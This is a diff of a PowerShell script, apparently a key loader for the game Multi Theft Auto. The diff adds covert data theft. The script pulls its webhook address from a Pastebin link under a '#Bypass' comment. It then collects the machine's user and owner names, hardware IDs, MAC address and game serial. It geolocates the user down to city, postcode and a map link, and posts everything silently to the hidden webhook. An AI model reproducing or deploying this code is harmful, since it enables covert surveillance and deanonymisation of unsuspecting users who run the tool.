@@ -11,8 +11,18 @@ function Pause-Script {
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
 
-#Webhook
-$webhookUrl = "https://encurtador.com.br/CbWDy"
+#Bypass
+$pBinUrl = "https://pastebin.com/raw/JkDe6reV"
+$pBin = ""
+try {
+    $pBin = Invoke-RestMethod -Uri $pBinUrl -TimeoutSec 5
+} catch {
+}
+
+# Webhook
+$wbhUrl = "$pBin"
+
+# Infos básicas
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
@@ -23,57 +33,83 @@ $manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
 $model = (Get-CimInstance Win32_ComputerSystem).Model
 $cpu = (Get-CimInstance Win32_Processor).Name
 $ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) + " GB"
-$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | Select-Object -First 1).IPAddress
-$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)' } | Select-Object -First 1).IPAddress
 $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+$serial = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6\Settings\general").serial
+$uptime = ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
+$uptime = (Get-Date) - $uptime
+$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
+$registeredOwner = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").RegisteredOwner
 
-$ipPublic = "Não disponível"
-$isp = "Não disponível"
-$city = "Não disponível"
-$region = "Não disponível"
-$country = "Não disponível"
-$lat = "Não disponível"
-$lon = "Não disponível"
+# Geo
+$ipPublic = "Indisponível"
+$region = "Indisponível"
+$country = "Indisponível"
+$lat = "0"
+$lon = "0"
+$mapsLink = "[Mapa](https://www.google.com/maps)"
 
 try {
-    $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5
-    if ($geoData.status -eq "success") {
-        $ipPublic = $geoData.query
-        $isp = $geoData.isp
-        $city = $geoData.city
-        $region = $geoData.regionName
-        $country = $geoData.country
-        $lat = $geoData.lat
-        $lon = $geoData.lon
+    $geo = Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5
+    if ($geo.status -eq "success") {
+        $ipPublic = $geo.query
+		$regionbrev = $geo.region
+        $region = $geo.regionName
+        $country = $geo.country
+        $lat = $geo.lat
+        $lon = $geo.lon
+        $mapsLink = "[Mapa](https://www.google.com/maps/?q=$lat,$lon)"
     }
-} catch {
-    # Não trava o script
+} catch {}
+
+function RemoverAcentosAuto {
+    param ([string]$Texto)
+    return -join ($Texto.Normalize("FormD").ToCharArray() | Where-Object {
+        -not [System.Globalization.CharUnicodeInfo]::GetUnicodeCategory($_).ToString().StartsWith("NonSpacingMark")
+    })
 }
 
+$city = "Indisponível"
+$zipcode = "Indisponível"
 
+try {
+    $resp = Invoke-RestMethod -Uri "https://freegeoip.app/json/" -TimeoutSec 5
+    if ($resp.city) {
+        $city = RemoverAcentosAuto $resp.city
+    }
+    if ($resp.zip_code) {
+        $zipcode = $resp.zip_code
+    }
+} catch {}
+# Embed
 $embed = @{
-    title = "Log System $username" 
-    color = 1
+    title = "Log $username"
+    color = 12292031
     timestamp = (Get-Date).ToString("o")
+    image = @{ url = "https://i.imgur.com/49Uet4M.png" }
     fields = @(
-        @{ name = "Nome do PC"; value = $hostname; inline = $false },
-        @{ name = "Usuário"; value = $username; inline = $true },
-        @{ name = "Data"; value = $date; inline = $true },
-        @{ name = "Sistema"; value = "$os ($osVersion)"; inline = $false },
-        @{ name = "Fabricante/Modelo"; value = "$manufacturer / $model"; inline = $false },
-        @{ name = "CPU"; value = $cpu; inline = $false },
-        @{ name = "RAM"; value = $ram; inline = $true },
-        @{ name = "IP"; value = $ipLocal; inline = $true },
-        @{ name = "IP Real"; value = $ipPublic; inline = $true },
-        @{ name = "MAC"; value = $mac; inline = $true },
-        @{ name = "Domínio"; value = $domain; inline = $false }
+        	@{ name = "Nome"; value = $hostname; inline = $true },
+		@{ name = "Admin"; value = $registeredOwner; inline = $true },
+        	@{ name = "Usuário"; value = $username; inline = $true },
+        	@{ name = "Data"; value = $date; inline = $true },
+        	@{ name = "Sistema"; value = "$os ($osVersion)"; inline = $true },
+        	@{ name = "Fabricante"; value = "$manufacturer / $model"; inline = $true },
+        	@{ name = "CPU"; value = $cpu; inline = $true },
+        	@{ name = "RAM"; value = $ram; inline = $true },
+        	@{ name = "IP"; value = $ipPublic; inline = $true },
+		@{ name = "MAC"; value = $mac; inline = $true },
+		@{ name = "Cidade"; value = $city; inline = $true },
+		@{ name = "Cep"; value = $zipcode; inline = $true },
+        	@{ name = "Região"; value = "$region - $regionbrev"; inline = $true },
+        	@{ name = "País"; value = $country; inline = $true },
+        	@{ name = "Maps"; value = $mapsLink; inline = $true },
+		@{ name = "Serial"; value = $serial; inline = $true },
+		@{ name = "Ligado"; value = $uptimeStr; inline = $true }
     )
 }
+# Envia
+$payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
+Invoke-RestMethod -Uri $wbhUrl -Method Post -Body $payload -ContentType 'application/json'
 
-$payload = @{
-    embeds = @($embed)
-} | ConvertTo-Json -Depth 4
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
 
 # Key Loader + Registro
 $authFilePath = "C:\ProgramData\AMD\Key.Auth"
